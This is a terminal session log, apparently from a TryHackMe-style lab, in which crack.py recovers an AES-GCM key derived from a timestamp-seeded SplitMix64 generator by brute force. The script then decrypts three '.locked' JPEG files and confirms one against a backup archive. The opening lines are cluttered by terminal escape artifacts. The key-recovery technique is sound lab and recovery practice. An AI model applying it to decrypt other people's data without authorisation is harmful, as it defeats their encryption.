+[7m    key = splitmix_key(seed)[27m[7m    ks = Cipher(algorithms.AES(key), modes.CTR(ctr_iv)).decryptor().update(ct[:16])[27m[7m    if ks[:3] == b"\xff\xd8\xff":[27m[7m        try:[27m[7m            AESGCM(key).decrypt(nonce, ct + tag, aad)   # full tag verification[27m[7m            found = seed[27m[7m            break[27m[7m        except Exception:[27m[7m            pass[27m[7mprint("SEED =", found)[27m[7mif found:[27m[7m    key = splitmix_key(found)[27m[7m    print("KEY  =", key.hex())[27m[7m    os.makedirs("out", exist_ok=True)[27m[7m    for n in ("yard_0147.jpg", "yard_0148.jpg", "yard_0152.jpg"):[27m[7m        aad, nonce, tag, ct = parse(n + ".locked")[27m[7m        pt = AESGCM(key).decrypt(nonce, ct + tag, aad)[27m[7m        open("out/" + n, "wb").write(pt)[27m[7m        print("decrypted", n, len(pt))[27m[7mEOF[27m[A[A[A[A[A[A[A[A    return d[:0x1c], d[0x10:0x1c], d[0x1c:0x2c], d[0x30:]
+
+aad, nonce, tag, ct = parse("yard_0147.jpg.locked")
+
+# fast pre-check: first keystream block (GCM counter starts at 2) must give JPEG magic
+ctr_iv = nonce + (2).to_bytes(4, "big")
+found = None
+for seed in range(1792474614000, 1792474640000):
+    key = splitmix_key(seed)    ks = Cipher(algorithms.AES(key), modes.CTR(ctr_iv)).decryptor().update(ct[:16])    if ks[:3] == b"\xff\xd8\xff":        try:            AESGCM(key).decrypt(nonce, ct + tag, aad)   # full tag verification            found = seed            break        except Exception:            passprint("SEED =", found)if found:    key = splitmix_key(found)    print("KEY  =", key.hex())    os.makedirs("out", exist_ok=True)    for n in ("yard_0147.jpg", "yard_0148.jpg", "yard_0152.jpg"):        aad, nonce, tag, ct = parse(n + ".locked")        pt = AESGCM(key).decrypt(nonce, ct + tag, aad)        open("out/" + n, "wb").write(pt)        print("decrypted", n, len(pt))EOF
+[?2004l[?2004h]0;ubuntu@tryhackme: ~/work[01;32mubuntu@tryhackme[00m:[01;34m~/work[00m$ ls
+[?2004lRESTORE.txt  [0m[01;34mdb[0m        [01;31mexp3.tar[0m     gallery.service  indexd.bin.lock   system.journal        yard_0148.jpg.locked
+access.log   [01;31mexp1.tar[0m  gallery.env  indexd.bin       [00;90mindexd.bin.lock~[0m  system_old.journal    yard_0152.jpg.locked
+crack.py     [01;31mexp2.tar[0m  gallery.py   indexd.bin.gpr   [01;34mindexd.bin.rep[0m    yard_0147.jpg.locked
+[?2004h]0;ubuntu@tryhackme: ~/work[01;32mubuntu@tryhackme[00m:[01;34m~/work[00m$ cat crack.py 
+[?2004limport struct, os
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+
+M = (1 << 64) - 1
+def splitmix_key(seed):
+    s = seed
+    out = b""
+    for _ in range(4):
+        s = (s + 0x9e3779b97f4a7c15) & M
+        z = s
+        z = ((z ^ (z >> 30)) * 0xbf58476d1ce4e5b9) & M
+        z = ((z ^ (z >> 27)) * 0x94d049bb133111eb) & M
+        z = z ^ (z >> 31)
+        out += struct.pack("<Q", z)
+    return out
+
+def parse(path):
+    d = open(path, "rb").read()
+    assert d[:4] == b"GPH1"
+    return d[:0x1c], d[0x10:0x1c], d[0x1c:0x2c], d[0x30:]
+
+aad, nonce, tag, ct = parse("yard_0147.jpg.locked")
+
+# fast pre-check: first keystream block (GCM counter starts at 2) must give JPEG magic
+ctr_iv = nonce + (2).to_bytes(4, "big")
+found = None
+for seed in range(1792474614000, 1792474640000):
+    key = splitmix_key(seed)
+    ks = Cipher(algorithms.AES(key), modes.CTR(ctr_iv)).decryptor().update(ct[:16])
+    if ks[:3] == b"\xff\xd8\xff":
+        try:
+            AESGCM(key).decrypt(nonce, ct + tag, aad)   # full tag verification
+            found = seed
+            break
+        except Exception:
+            pass
+
+print("SEED =", found)
+if found:
+    key = splitmix_key(found)
+    print("KEY  =", key.hex())
+    os.makedirs("out", exist_ok=True)
+    for n in ("yard_0147.jpg", "yard_0148.jpg", "yard_0152.jpg"):
+        aad, nonce, tag, ct = parse(n + ".locked")
+        pt = AESGCM(key).decrypt(nonce, ct + tag, aad)
+        open("out/" + n, "wb").write(pt)
+        print("decrypted", n, len(pt))
+[?2004h]0;ubuntu@tryhackme: ~/work[01;32mubuntu@tryhackme[00m:[01;34m~/work[00m$ [7mpython3 crack.py[27mpython3 crack.py
+[?2004lSEED = 1792474614662
+KEY  = 2cd60b8474eba1744f19b0e537ff0ecbd1ae03d2d9ed24ddab3bd9729d7c0190
+decrypted yard_0147.jpg 278610
+decrypted yard_0148.jpg 418140
+decrypted yard_0152.jpg 180683
+[?2004h]0;ubuntu@tryhackme: ~/work[01;32mubuntu@tryhackme[00m:[01;34m~/work[00m$ [7mcmp out/yard_0147.jpg <(tar -xOf exp1.tar yard_0147.jpg) && echo "MATCH"[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ccmp out/yard_0147.jpg <(tar -xOf exp1.tar yard_0147.jpg) && echo "MATCH"
+[?2004lMATCH
+[?2004h]0;ubuntu@tryhackme: ~/work[01;32mubuntu@tryhackme[00m:[01;34m~/work[00m$ [7meom out/yard_0148.jpg &[27m[Kexit
+[?2004llogout
+Connection to dead.endpoint.thm closed.
+
+Script done on 2026-10-23 03:13:07+03:00 [COMMAND_EXIT_CODE="0"]
